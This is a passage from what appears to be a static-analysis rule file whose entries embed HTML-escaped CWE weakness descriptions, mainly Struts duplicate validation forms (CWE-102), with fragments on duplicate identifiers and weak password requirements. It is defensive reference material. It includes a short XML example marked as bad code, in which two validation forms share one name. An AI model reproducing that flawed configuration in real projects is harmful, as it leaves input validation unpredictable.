&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_694_Other Notes" id="oc_694_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This weakness is probably closely associated with other issues related to
doubling, such as CWE-675 (Duplicate Operations on Resource). It's usually a
case of an API contract violation (CWE-227).&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_694_Relationships" id="oc_694_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;573&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=573" target="_blank"&gt;Failure to Follow Specification&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;102&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=102" target="_blank"&gt;Struts: Duplicate Validation Forms&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;462&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=462" target="_blank"&gt;Duplicate Key in Associative List (Alist)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relevant Properties"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relevant Properties&lt;/div&gt;&lt;div name="oc_694_Relevant Properties" id="oc_694_Relevant Properties" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Uniqueness&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_694_Content History" id="oc_694_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_660</key><name>Struts_Duplicate_Validation_Forms</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Duplicate Validation Forms&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;102&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_102_Description" id="oc_102_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The application uses multiple validation forms with the same
name, which might cause the Struts Validator to validate a form that the
programmer does not expect.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;If two validation forms have the same name, the Struts Validator
arbitrarily chooses one of the forms to use for input validation and
discards the other. This decision might not correspond to the programmer's
expectations, possibly leading to resultant weaknesses. Moreover, it
indicates that the validation logic is not up-to-date, and can indicate that
other, more subtle validation errors are present.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_102_Time of Introduction" id="oc_102_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_102_Applicable Platforms" id="oc_102_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_102_Common Consequences" id="oc_102_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If a J2EE application interfaces with native code that does not
perform array bounds checking, an attacker may be able to use an input
validation mistake in the J2EE application to launch a buffer overflow
attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_102_Demonstrative Examples" id="oc_102_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;Two validation forms with the same name.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;XML&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;form-validation&amp;gt;&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;formset&amp;gt;&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;form name="ProjectForm"&amp;gt; ...
&amp;lt;/form&amp;gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;form name="ProjectForm"&amp;gt; ...
&amp;lt;/form&amp;gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;/formset&amp;gt;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;/form-validation&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;It is critically important that validation logic be maintained and
kept in sync with the rest of the application.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_102_Potential Mitigations" id="oc_102_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;The DTD or schema validation will not catch the duplicate occurrence
of the same form name. To find the issue in the implementation, manual
checks or automated static analysis could be applied to the xml
configuration files.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Background Details"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Background Details&lt;/div&gt;&lt;div name="oc_102_Background Details" id="oc_102_Background Details" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Unchecked input is the root cause of some of today's worst and most common
software security problems. Cross-site scripting, SQL injection, and process
control vulnerabilities can all stem from incomplete or absent input
validation. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_102_Weakness Ordinalities" id="oc_102_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_102_Relationships" id="oc_102_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;694&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=694" target="_blank"&gt;Use of Multiple Resources with Duplicate Identifier&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;675&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=675" target="_blank"&gt;Duplicate Operations on Resource&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('102_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_102_Causal Nature" id="oc_102_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_102_Taxonomy Mappings" id="oc_102_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Duplicate Validation Forms&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_102_Content History" id="oc_102_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Example, Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Other Notes,
Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Background Details, Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1972</key><name>ESAPI_Same_Password_Repeats_Twice</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Weak Password Requirements&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;521&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_521_Description" id="oc_521_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product does not require that users should have strong
passwords, which makes it easier for attackers to compromise user
accounts.&lt;/div&gt;
